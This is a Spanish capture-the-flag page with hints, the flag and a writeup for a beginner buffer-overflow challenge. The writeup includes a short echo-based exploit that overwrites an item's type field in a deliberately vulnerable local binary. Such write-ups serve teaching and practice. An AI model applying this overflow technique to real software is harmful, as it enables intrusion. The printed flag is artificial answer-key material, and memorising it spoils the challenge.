# Tito Klecko's Storage
- **Categoría:** Pwn
- **Dificultad:** ★★☆☆☆
- **Autor:** [Klecko](https://twitter.com/klecko0)

### Descripción
¡Bienvenido al almacén del tito Klecko!  
¿Qué tipo de objeto quieres guardar...?  


  
### Archivos e instrucciones
chall.zip / new_chall.zip    

### Hints
1. Cambiando el nombre hay buffer overflow en el primer item.
2. Los ints se codifican en formato little-endian.
3. Puedes usar echo o python para imprimir bytes. Los siguientes comandos imprimen los bytes asociados al numero 0x00452301:
	`echo -e "\x01\x23\x45\x00"`
	`python3 -c "import sys; sys.stdout.buffer.write(b'\x01\x23\x45\x00')"`
    
<br>

### Flag
``CTFUni{0verfl0w_4_ITEM_FLAG!!1}``  
<br>



## Writeup
Es un programa que te pide el nombre y te permite guardar hasta 4 items, que luego se pueden visualizar o editar. Cada item pueden ser int o string, pero hay un tipo más que en principio no deja ponerlo: ITEM_WIN. Al intentar visualizar un item con este tipo nos imprime la flag.  

Con la opción 4 podemos modificar el nombre. El tamaño del buffer está mal, de forma que se puede hacer overflow en los items y cambiar el tipo del primero de ellos a ITEM_WIN.  

El exploit simplemente accede a esta opción, metiendo 32 de padding (el tamaño real del buffer) y un 3 encodeado en little-endian. Después, muestra el item para obtener la flag.

Exploit:
```sh
echo -e "pepe\n4\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x03\x00\x00\x00\x00\x00\x00\x00\n2\n0\n" > input
./chall/items1 < input
```

<br>



